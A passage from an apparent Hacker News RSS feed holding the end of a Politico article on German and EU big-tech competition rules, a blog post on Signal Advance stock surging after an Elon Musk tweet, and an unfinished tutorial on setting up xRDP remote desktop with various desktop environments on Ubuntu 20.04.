<p>The vote comes weeks after the European Commission <a href="https://www.politico.eu/article/europe-digital-markets-act-services-act-tech-competition-rules-margrethe-vestager-thierry-breton/">proposed</a> a similar framework in its Digital Markets Act (DMA). For Germany, which has together with France been a <a href="https://www.politico.eu/article/eu-big-four-france-germany-italy-poland-press-executive-vice-president-margrethe-vestager-to-clear-path-for-champions/">driving force</a> behind the DMA, having its own rules in place means Berlin could apply more pressure on Brussels to improve ‚Äî or at least not weaken ‚Äî the EU proposal.</p>



<p>Germany wants national competition authorities, including the Bundeskartellamt, to have a coordinating role in the enforcement of the Digital Markets Act, said a person familiar with the German negotiating position. This is not foreseen in the Commission's proposal.</p>



<p>Mohrs said he would "definitely prefer a European approach. We hope <a href="https://www.politico.eu/wp-content/uploads/2021/01/13/German-Competition-Law-Reform-Compromise-Draft.pdf">this law</a> and its application can help inform the EU in its legislative process."</p>



<p>Asked if the German regime will be abandoned once the European rules enter into force, Mohrs said: "We will see if the Digital Markets Act will cover the practices at the same level of effectiveness as the [updated German law]."</p>



<p>‚ÄúI assume that, at least at the beginning, Germany and the EU will try to find some compromise about sharing responsibility for the enforcement of rules applicable to large internet platforms in Europe,‚Äù said Clifford Chance competition lawyer Michael Dietrich.</p>



<h3>Platform pushback</h3>



<p>In its efforts to draw up a fast and functional framework, Germany may have left the platforms and their advisers with at least two&nbsp;big&nbsp;avenues to challenge enforcement of the measure.&nbsp;The first is the proposed expedited appeals process.&nbsp;</p>



<p>To prevent internet platforms from stretching out legal procedures, lawmakers want appeals against decisions under the new regime to go straight to the Federal Supreme Court in Karlsruhe, skipping the usual first step of the Higher Regional Court in D√ºsseldorf.</p>



<p>According to two German competition lawyers, such a shortened appeal procedure could be considered unconstitutional. The Supreme Court normally only reviews questions of law, but would operate in this case as the only instance when facts would be reviewed. And rights of defense would also be curtailed in front of the competition authority, where the burden of proof is shifted to the platforms, meaning they need to demonstrate that they did not break the law.</p>



<p>Keeping the German regime in place after the DMA enters into force also could expose Bundeskartellamt decisions to claims by the platforms that only the EU has jurisdiction to regulate gatekeepers.</p>



<p>The DMA seeks to harmonize gatekeeper rules across the bloc, saying that "Member States shall not impose on gatekeepers further obligations by way of laws, regulations or administrative action for the purpose of ensuring contestable and fair&nbsp;markets."  </p>



<p>While the EU is said to have come to an understanding with Germany that its regime is considered an extension of competition law and therefore exempted from the harmonization rule, legal experts agree that the German rules are at least a gray zone between competition law and regulation. </p>



<p>"In my view, you could well consider [the German regime] as regulation rather than competition law," said Romina Polley, a competition lawyer at Cleary Gottlieb who advises Google on the reform. </p>



<p>Polley argued that the German regime enables the competition authority to prohibit conduct<strong> </strong>by an online platform before it takes place without a detailed assessment of the platform's power on a specific market or the effects of its conduct, as is usual in antitrust cases. </p>



<p>"GAFA companies might claim in later proceedings against a prohibition under [the new German rules] that its legal basis conflicts with the EC‚Äôs exclusive jurisdiction," Polley said, referring to the tech giants. </p>







<p><em>This story has been updated to reflect the outcome of the parliament vote.</em> </p>




								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/germany-shows-eu-the-way-in-curbing-big-tech/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790385</guid>
            <pubDate>Fri, 15 Jan 2021 12:55:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two Words from Elon Musk send a stock up 527%]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790370">thread link</a>) | @RickJWagner
<br/>
January 15, 2021 | https://compoundadvisors.com/2021/a-clear-signal-of-insanity | <a href="https://web.archive.org/web/*/https://compoundadvisors.com/2021/a-clear-signal-of-insanity">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
<p>There‚Äôs been a lot of <a href="https://compoundadvisors.com/2020/the-craziest-thing-in-markets-you-may-ever-see" target="_blank" rel="noreferrer noopener">crazy things</a> going on in markets lately, but this one may top them all.</p>



<p>Last Thursday morning, Elon Musk sent out this tweet to his 41 million followers‚Ä¶</p>



<figure><img loading="lazy" width="558" height="98" src="https://compoundadvisors.com/wp-content/uploads/2021/01/image-18.png" alt="" srcset="https://compoundadvisors.com/wp-content/uploads/2021/01/image-18.png 558w, https://compoundadvisors.com/wp-content/uploads/2021/01/image-18-300x53.png 300w" sizes="(max-width: 558px) 100vw, 558px"></figure>



<p>What‚Äôs Signal?</p>



<p>It‚Äôs a messaging app for your phone and an alternative to WhatsApp, which has been criticized recently for <a href="https://www.pcmag.com/news/elon-musk-tells-followers-to-use-signal-messaging-app-amid-whatsapp-privacy" target="_blank" rel="noreferrer noopener">privacy concerns</a> (sharing data with Facebook, its parent company).</p>



<p>As one might have guessed, the demand for Signal exploded after Musk‚Äôs tweet.</p>



<p>And as a result, traders naturally looked to the financial markets to see if they could profit from it.</p>



<p>In searching for Signal, what they found was a company called ‚ÄúSignal Advance.‚Äù</p>



<p>Are they one in the same?</p>



<p>Not exactly.</p>



<p>Signal Advance is a small company that has absolutely nothing to do with the <a href="https://en.wikipedia.org/wiki/Signal_(software)" target="_blank" rel="noreferrer noopener">nonprofit company called Signal</a> or its messaging app. </p>



<p>Did that stop traders from buying Signal Advance ($SIGL)?</p>



<p>Not at all.</p>



<p>It closed last Thursday (1/7) at $3.76, an increase of 527% from the day before the Musk tweet.</p>



<p>Did traders soon realize their mistake and reverse course?</p>



<p>No. Last Friday (1/8), it closed at $7.19, up another 91%. </p>



<p>Surely that was the end of it, right?</p>



<p>Nope. Today the stock hit a high of $70.85, a 118x increase from last Wednesday‚Äôs close.</p>



<figure><a href="https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11.png" target="_blank" rel="noopener"><img loading="lazy" width="990" height="591" src="https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11.png" alt="" srcset="https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11.png 990w, https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11-300x179.png 300w, https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11-768x458.png 768w" sizes="(max-width: 990px) 100vw, 990px"></a></figure>



<p>Its market cap at today‚Äôs high hit $739 million, up from $6 million before the Musk tweet.</p>



<p>If that‚Äôs not a clear signal of insanity, I don‚Äôt know what is.</p>



<p>‚Äî</p>



<p>To sign up for our free newsletter,&nbsp;<a rel="noreferrer noopener" href="https://compoundadvisors.com/newsletter" target="_blank">click here</a>.</p>



<p>Disclaimer: All information provided is for educational purposes only and does not constitute investment, legal or tax advice, or an offer to buy or sell any security. For our full disclosures,&nbsp;<a rel="noreferrer noopener" href="https://compoundadvisors.com/site-disclosures" target="_blank">click here</a>.</p>
</div></div>]]>
            </description>
            <link>https://compoundadvisors.com/2021/a-clear-signal-of-insanity</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790370</guid>
            <pubDate>Fri, 15 Jan 2021 12:54:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Connect to an Ubuntu 20.04 Server via Remote Desktop Connection w/ XRDP]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790225">thread link</a>) | @punkspider
<br/>
January 15, 2021 | https://thunderboltlaptop.com/install-xrdp-ubuntu/ | <a href="https://web.archive.org/web/*/https://thunderboltlaptop.com/install-xrdp-ubuntu/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>In this tutorial we‚Äôll install <strong>xRDP</strong> on a server running <strong>Ubuntu 20.04</strong> and install multiple desktop environments on it (Openbox, GNOME, XFCE, LXQt, LXDE, MATE, KDE Plasma). We‚Äôll see how to connect via RDP from Windows, Linux, macOS, Android and iOS, how to optimize the connection speed in some cases, and how to fix a few common issues when using xRDP.</p>
<p>xRDP is a free and open-source implementation of Microsoft RDP (Remote Desktop Protocol) that enables other operating systems, other than Windows, to provide a fully functional remote desktop experience.</p>
<p>xRDP is fully compatible with <code>Microsoft RDP</code>, <code>rdesktop</code>, <code>FreeRDP</code> and <code>NeutrinoRDP</code>.</p>
<p>With xRDP you can have your own RDP Server on your Linux box, and connect to it via Microsoft‚Äôs Remote Desktop Client (if you use Windows), but also, you can use Linux, macOS, Android and iOS using their respective clients.</p>

<h2><span id="Prerequisites"></span><strong>Prerequisites</strong><span></span></h2>
<ul>
<li>A Linux box running Ubuntu 20.04.</li>
<li>A Desktop Environment.</li>
<li>A user with <code>sudo</code> privileges. We recommend a <strong>non-root</strong> <code>sudo</code> user, because acting as root can damage your system if you‚Äôre not careful. When you‚Äôre logged in as <code>root</code>, applications are running with <strong>root privileges</strong> and because of some bug or vulnerability they can damage your system. You can do anything and the system won‚Äôt ask, and you can easily change the system in a way that could be harmful, if you‚Äôre not careful. If you act as a <code>non-root</code> <code>sudo</code> user, then the system will ask for the password, which could make you pause and prevent you from making a potentially harmful change.</li>
</ul>
<hr>
<h2><span id="Step_1_%E2%80%93_Install_xRDP_on_Ubuntu_20_04"></span>Step 1 ‚Äì Install xRDP on Ubuntu 20.04<span></span></h2>
<p>To begin,we‚Äôll update the package index:</p>
<pre data-enlighter-language="generic">sudo apt update</pre>
<p>To install xRDP, run the command:</p>
<pre data-enlighter-language="generic">sudo apt -y install xrdp</pre>
<p>The output will look something like this:</p>
<pre data-enlighter-language="generic">Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libunity-gtk2-parser0 libunity-gtk3-parser0 unity-gtk-module-common
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  xorgxrdp
Suggested packages:
  guacamole xrdp-pulseaudio-installer
The following NEW packages will be installed:
  xorgxrdp xrdp
0 upgraded, 2 newly installed, 0 to remove and 147 not upgraded.
Need to get 488 kB of archives.
After this operation, 3212 kB of additional disk space will be used.</pre>
<p>Once installed, it should run as a service automatically. You can check it by typing:</p>
<pre data-enlighter-language="generic">sudo systemctl status xrdp</pre>
<p>You should see something like:</p>
<pre data-enlighter-language="generic">‚óè xrdp.service - xrdp daemon
     Loaded: loaded (/lib/systemd/system/xrdp.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2020-12-23 15:10:48 CET; 3min 24s ago
       Docs: man:xrdp(8)
             man:xrdp.ini(5)
   Main PID: 1937 (xrdp)
      Tasks: 1 (limit: 1068)
     Memory: 1.4M
     CGroup: /system.slice/xrdp.service
             ‚îî‚îÄ1937 /usr/sbin/xrdp</pre>
<p>xRDP makes use of the file <code>/etc/ssl/private/ssl-cert-snakeoil.key</code> which belongs to the <code>ssl-cert</code> group. Therefore, we need to add the xRDP user to that group:</p>
<pre data-enlighter-language="generic">sudo adduser xrdp ssl-cert</pre>
<p>We need to restart xRDP to changes to take effect:</p>
<pre data-enlighter-language="generic">sudo systemctl restart xrdp</pre>
<p>At this point, you have xRDP installed and running on your Ubuntu.</p>
<h3><span id="Opening_Ports"></span>Opening Ports<span></span></h3>
<p>Assuming you have Uncomplicated Firewall (<strong>ufw</strong>) installed and active, to be able to connect to our server, we need to open the 3389 (defaulft) port on our Firewall.</p>
<p>To accomplish this, we need to run:</p>
<pre data-enlighter-language="generic">sudo ufw allow 3389</pre>
<p>You can secure it even more, by allowing only a specific IP address or IP range:</p>
<p>For a specific IP address:</p>
<pre data-enlighter-language="generic">sudo ufw allow from 1.1.1.1 to any port 3389</pre>
<p>For a specific IP range:</p>
<pre data-enlighter-language="generic">sudo ufw allow from 192.168.0.0/24 to any port 3389</pre>
<h3><span id="xRDP_Configuration"></span>xRDP Configuration<span></span></h3>
<p>By default, you don‚Äôt need to make any changes. But you can change the default port, add compression, and other settings by typing:</p>
<pre data-enlighter-language="generic">sudo nano /etc/xrdp/xrdp.ini</pre>
<p>Remember to restart the service, after any change.</p>
<h2><span id="Step_2_%E2%80%93_Install_Your_Preferred_Desktop_Environment"></span>Step 2 ‚Äì Install Your Preferred Desktop Environment<span></span></h2>
<p>To be able to connect to your box with xRDP, you‚Äôll need at least one desktop environment installed on it.</p>
<h3><span id="Install_GNOME_Desktop_Environment"></span>Install GNOME Desktop Environment<span></span></h3>
<p><strong>GNOME</strong> is the default desktop environment for many Linux distros. At the time of writing, the latest version is GNOME 3.</p>
<p>To install it, run the following command:</p>
<pre data-enlighter-language="generic">sudo apt -y install ubuntu-desktop</pre>
<p>This is how GNOME Desktop looks like when you log in:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome.png" alt="xRDP GNOME Desktop" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-1536x864.png 1536w"></p>
<h3><span id="Install_XFCE_Desktop_Environment"></span>Install XFCE Desktop Environment<span></span></h3>
<p><strong>XFCE</strong> is another Desktop Environment but low on system resources and fast. In other words: a lightweight desktop. You can install it by typing:</p>
<pre data-enlighter-language="generic">sudo apt -y install xubuntu-desktop xubuntu-core</pre>
<p>This is how XFCE looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png" alt="xRDP XFCE4 Desktop" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1536x864.png 1536w"></p>
<h3><span id="Install_LXQt_Desktop_Environment"></span>Install LXQt Desktop Environment<span></span></h3>
<p><strong>LXQt</strong> is a port of LXDE. As LXDE, it has low resource requirements, in comparison to most popular desktop environments. It‚Äôs one of the better choices to use with xRDP, in my opinion.</p>
<p>To install it run:</p>
<pre data-enlighter-language="generic">sudo apt -y install lxqt</pre>
<p>This is how LXQt looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png" alt="xRDP LXQT" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1536x864.png 1536w"></p>
<h3><span id="Install_LXDE_Desktop_Environment"></span>Install LXDE Desktop Environment<span></span></h3>
<p><strong>LXDE</strong> (Lightweight X11 Desktop Environment) is a popular lightweight desktop environment. It‚Äôs built to have low resource requirements, and is another great choice for xRDP.</p>
<p>There are multiple ways you can install it. For the purposes of this tutorial I‚Äôm using a simple command. If you‚Äôd like different methods, based on certain preferences you may have, you can check the <a href="https://wiki.lxde.org/en/Installation" target="_blank" rel="noopener">Intallation section on LXDE.org</a></p>
<p>To quickly install LXDE run:</p>
<pre data-enlighter-language="generic">sudo apt -y install lxde</pre>
<p>This is how LXDE looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png" alt="xRDP LXDE" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1536x864.png 1536w"></p>
<h3><span id="Install_MATE_Desktop_Environment"></span>Install MATE Desktop Environment<span></span></h3>
<p><strong>MATE</strong> is an attractive and intuitive Desktop Environment. A fork from the GNOME 2 Desktop, in response to the negative reception of GNOME 3, when the traditional taskbar (<a href="https://en.wikipedia.org/wiki/GNOME_Panel" target="_blank" rel="noopener">GNOME Panel</a>) with the <a href="https://en.wikipedia.org/wiki/GNOME_Shell" target="_blank" rel="noopener">GNOME Shell</a>.</p>
<p>To install it run:</p>
<pre data-enlighter-language="generic">sudo apt -y install ubuntu-mate-desktop ubuntu-mate-core</pre>
<p>This is how MATE Desktop looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate.png" alt="xRDP MATE" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-1536x864.png 1536w"></p>
<h3><span id="Install_KDE_Plasma_Desktop_Environment"></span>Install KDE Plasma Desktop Environment<span></span></h3>
<p><strong>KDE Plasma</strong> is one of the most recognized Desktops Environments. It‚Äôs one of the most beautiful desktop environments, in my opinion, and it‚Äôs got some great features, and it‚Äôs very customizable.</p>
<p>You can install it by running:</p>
<pre data-enlighter-language="generic">sudo apt -y install kubuntu-desktop</pre>
<p>This is how KDE Plasma looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma.png" alt="xRDP KDE Plasma" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-1536x864.png 1536w"></p>
<h3><span id="Install_Openbox_Window_Manager"></span>Install Openbox Window Manager<span></span></h3>
<p><strong>Openbox</strong> is a window manager and not a desktop environment. It won‚Äôt offer you a wallpaper, taskbar or system panel. But it‚Äôs very lightweight and you can open the menu by right clicking anywhere on the screen and selecting what you want to run.</p>
<p>It‚Äôs probably the best choice if you find that your connection is laggy with xRDP, but you absolutely need to connect to a Linux machine using xRDP.</p>
<p>Here‚Äôs how Openbox looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox.png" alt="xRDP Openbox" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-1536x864.png 1536w"></p>
<hr>
<h2><span id="Switching_Between_Desktop_Environments_for_xRDP"></span>Switching Between Desktop Environments for xRDP<span></span></h2>
<p>If you have multiple desktop environments installed and want to switch between them you can run the following command:</p>
<pre data-enlighter-language="generic">sudo update-alternatives --config x-session-manager</pre>
<p>You‚Äôll be presented with the options representing your installed desktop environments. Just enter the number corresponding with your desktop environment from the list and press Enter.</p>
<pre data-enlighter-language="generic">There are 9 choices for the alternative x-session-manager (providing /usr/bin/x-session-manager).

  Selection    Path                      Priority   Status
------------------------------------------------------------
  0            /usr/bin/startlxde         50        auto mode
  1            /usr/bin/gnome-session     50        manual mode
  2            /usr/bin/lxsession         49        manual mode
  3            /usr/bin/mate-session      50        manual mode
  4            /usr/bin/openbox-session   40        manual mode
* 5            /usr/bin/startlxde         50        manual mode
  6            /usr/bin/startlxqt         50        manual mode
  7            /usr/bin/startplasma-x11   40        manual mode
  8            /usr/bin/startxfce4        50        manual mode
  9            /usr/bin/xfce4-session     40        manual mode

Press &lt;enter&gt; to keep the current choice[*], or type selection number: 2
update-alternatives: using /usr/bin/lxsession to provide /usr/bin/x-session-manager (x-session-manager) in manual mode</pre>
<p>In my example I have 9 choices:</p>
<p><code>0 - /usr/bin/startlxde</code> ‚Äì the current desktop environment<br>
<code>1 - /usr/bin/gnome-session</code> ‚Äì GNOME 3<br>
<code>2 - /usr/bin/lxsession</code> ‚Äì LXDE<br>
<code>3 - /usr/bin/mate-session</code> ‚Äì MATE Desktop<br>
<code>4 - /usr/bin/openbox-session</code> ‚Äì Openbox<br>
<code>5 - /usr/bin/startlxde</code> ‚Äì LXDE (same as lxsession)<br>
<code>6 - /usr/bin/startlxqt</code> ‚Äì LXQt<br>
<code>7 - /usr/bin/startplasma-x11</code> ‚Äì KDE Plasma<br>
<code>8 - /usr/bin/startxfce4</code> ‚Äì XFCE<br>
<code>9 - /usr/bin/xfce4-session</code> ‚Äì XFCE (same as startxfce4)</p>
<div><p>I believe the correct way to start <strong>LXDE</strong> is selecting <code>startlxde</code>, and to start <strong>XFCE</strong> select <code>startxfce4</code>. I am not yet sure why <strong>lxsession</strong> and <strong>startlxde</strong> both appear, as selecting either switches to LXDE. The same for <strong>startxfce4</strong> and <strong>xfce4-session</strong> ‚Äì selecting either will switch to XFCE. As far as I know, <strong>startlxde</strong> and <strong>startxfce4</strong> are scripts that call the executables lxsession and startlxde, respectively. If you know the explanation for this, then please feel free to let us know and we‚Äôll update the guide.</p></div><p>Next time you log into your server via xRDP, your desktop environment should be changed. There‚Äôs no need to restart xRDP for the changes to be applied.</p>
<h2><span id="Interacting_with_the_xRDP_service"></span>Interacting with the xRDP service<span></span></h2>
<p>Like any other service, you can interact with <em>xRDP</em> via <em>systemctl:</em></p>
<p>Stop xRDP Service:</p>
<pre data-enlighter-language="generic">sudo systemctl stop xrdp</pre>
<p>Start xRDP Service:</p>
<pre data-enlighter-language="generic">sudo systemctl start xrdp</pre>
<p>Enable xRDP on boot:</p>
<pre data-enlighter-language="generic">sudo systemctl enable xrdp</pre>
<p>Disable xRDP on boot:</p>
<pre data-enlighter-language="generic">sudo systemctl disable xrdp</pre>
<h2><span id="Step_3_%E2%80%93_Connecting_to_Your_Remote_Desktop"></span>Step 3 ‚Äì Connecting to Your Remote Desktop<span></span></h2>
<p>To connect to our new RDP service, we need to use a RDP Client.</p>
<h3><span id="Connect_from_Windows"></span>Connect from Windows<span></span></h3>
<p>Microsoft‚Äôs default RDP client it‚Äôs called ‚ÄúRemote Desktop Connection‚Äù, and it‚Äôs installed by default.</p>
<p>To quickly connect, enter the Ubuntu machine‚Äôs IP address or hostname, and click on <em>Connect</em>.</p>
<p>If you click <strong>Show Options</strong> you‚Äôll see more options, such as inputting the <code>User name</code>, saving credentials for future use, so you don‚Äôt have to add them every time, adjusting the connection quality preferences, and more.</p>
<p><img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1.png" alt="xRDP Windows" width="407" height="474" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1.png 407w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1-258x300.png 258w" data-sizes="(max-width: 407px) 100vw, 407px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1.png 407w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1-258x300.png 258w"></p>
<h3><span id="Connect_from_Linux"></span>Connect from Linux<span></span></h3>
<p>There are a lot ‚Ä¶</p></div></div>
